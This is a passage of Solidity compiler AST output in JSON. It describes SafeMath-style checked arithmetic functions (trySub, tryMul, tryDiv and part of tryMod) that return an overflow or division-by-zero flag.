														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "662:22:2"
									},
									"returnParameters": {
										"id": 169,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 166,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 190,
												"src": "708:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 165,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "708:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 168,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 190,
												"src": "714:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 167,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "714:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "707:15:2"
									},
									"scope": 467,
									"src": "647:222:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 217,
										"nodeType": "Block",
										"src": "1097:118:2",
										"statements": [
											{
												"id": 216,
												"nodeType": "UncheckedBlock",
												"src": "1108:100:2",
												"statements": [
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 204,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 202,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 195,
																"src": "1137:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"id": 203,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 193,
																"src": "1141:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1137:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 209,
														"nodeType": "IfStatement",
														"src": "1133:28:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 205,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1152:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 206,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1159:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 207,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "1151:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 201,
															"id": 208,
															"nodeType": "Return",
															"src": "1144:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 210,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1184:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 213,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 211,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 193,
																		"src": "1190:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"id": 212,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 195,
																		"src": "1194:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "1190:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 214,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "1183:13:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 201,
														"id": 215,
														"nodeType": "Return",
														"src": "1176:20:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 191,
										"nodeType": "StructuredDocumentation",
										"src": "877:138:2",
										"text": " @dev Returns the subtraction of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 218,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "trySub",
									"nameLocation": "1030:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 196,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 193,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "1045:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 218,
												"src": "1037:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 192,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1037:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 195,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "1056:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 218,
												"src": "1048:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 194,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1048:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1036:22:2"
									},
									"returnParameters": {
										"id": 201,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 198,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 218,
												"src": "1082:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 197,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1082:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 200,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 218,
												"src": "1088:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 199,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1088:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1081:15:2"
									},
									"scope": 467,
									"src": "1021:194:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 259,
										"nodeType": "Block",
										"src": "1446:427:2",
										"statements": [
											{
												"id": 258,
												"nodeType": "UncheckedBlock",
												"src": "1457:409:2",
												"statements": [
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 232,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 230,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 221,
																"src": "1719:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"hexValue": "30",
																"id": 231,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1724:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "1719:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 237,
														"nodeType": "IfStatement",
														"src": "1715:28:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "74727565",
																		"id": 233,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1735:4:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "true"
																	},
																	{
																		"hexValue": "30",
																		"id": 234,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1741:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 235,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "1734:9:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 229,
															"id": 236,
															"nodeType": "Return",
															"src": "1727:16:2"
														}
													},
													{
														"assignments": [
															239
														],
														"declarations": [
															{
																"constant": false,
																"id": 239,
																"mutability": "mutable",
																"name": "c",
																"nameLocation": "1766:1:2",
																"nodeType": "VariableDeclaration",
																"scope": 258,
																"src": "1758:9:2",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 238,
																	"name": "uint256",
																	"nodeType": "ElementaryTypeName",
																	"src": "1758:7:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"visibility": "internal"
															}
														],
														"id": 243,
														"initialValue": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 242,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 240,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 221,
																"src": "1770:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "*",
															"rightExpression": {
																"id": 241,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 223,
																"src": "1774:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1770:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "1758:17:2"
													},
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 248,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 246,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"id": 244,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 239,
																	"src": "1794:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"id": 245,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 221,
																	"src": "1798:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1794:5:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"id": 247,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 223,
																"src": "1803:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1794:10:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 253,
														"nodeType": "IfStatement",
														"src": "1790:33:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 249,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1814:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 250,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1821:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 251,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "1813:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 229,
															"id": 252,
															"nodeType": "Return",
															"src": "1806:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 254,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1846:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"id": 255,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 239,
																	"src": "1852:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 256,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "1845:9:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 229,
														"id": 257,
														"nodeType": "Return",
														"src": "1838:16:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 219,
										"nodeType": "StructuredDocumentation",
										"src": "1223:141:2",
										"text": " @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 260,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMul",
									"nameLocation": "1379:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 224,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 221,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "1394:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 260,
												"src": "1386:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 220,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1386:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 223,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "1405:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 260,
												"src": "1397:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 222,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1397:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1385:22:2"
									},
									"returnParameters": {
										"id": 229,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 226,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 260,
												"src": "1431:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 225,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1431:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 228,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 260,
												"src": "1437:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 227,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1437:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1430:15:2"
									},
									"scope": 467,
									"src": "1370:503:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 287,
										"nodeType": "Block",
										"src": "2105:119:2",
										"statements": [
											{
												"id": 286,
												"nodeType": "UncheckedBlock",
												"src": "2116:101:2",
												"statements": [
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 274,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 272,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 265,
																"src": "2145:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"hexValue": "30",
																"id": 273,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2150:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "2145:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 279,
														"nodeType": "IfStatement",
														"src": "2141:29:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 275,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "2161:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 276,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "2168:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 277,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "2160:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 271,
															"id": 278,
															"nodeType": "Return",
															"src": "2153:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 280,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2193:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 283,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 281,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 263,
																		"src": "2199:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"id": 282,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 265,
																		"src": "2203:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "2199:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 284,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "2192:13:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 271,
														"id": 285,
														"nodeType": "Return",
														"src": "2185:20:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 261,
										"nodeType": "StructuredDocumentation",
										"src": "1881:142:2",
										"text": " @dev Returns the division of two unsigned integers, with a division by zero flag.\n _Available since v3.4._"
									},
									"id": 288,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryDiv",
									"nameLocation": "2038:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 266,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 263,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "2053:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 288,
												"src": "2045:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 262,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2045:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 265,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "2064:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 288,
												"src": "2056:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 264,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2056:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2044:22:2"
									},
									"returnParameters": {
										"id": 271,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 268,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 288,
												"src": "2090:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 267,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2090:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 270,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 288,
												"src": "2096:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 269,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2096:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2089:15:2"
									},
									"scope": 467,
									"src": "2029:195:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 315,
										"nodeType": "Block",
										"src": "2466:119:2",
										"statements": [
											{
												"id": 314,
												"nodeType": "UncheckedBlock",
												"src": "2477:101:2",
												"statements": [
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 302,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 300,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 293,
																"src": "2506:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"hexValue": "30",
																"id": 301,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2511:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "2506:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 307,
														"nodeType": "IfStatement",
														"src": "2502:29:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 303,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "2522:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 304,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "2529:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 305,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "2521:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 299,
															"id": 306,
															"nodeType": "Return",
															"src": "2514:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 308,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2554:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 311,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 309,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
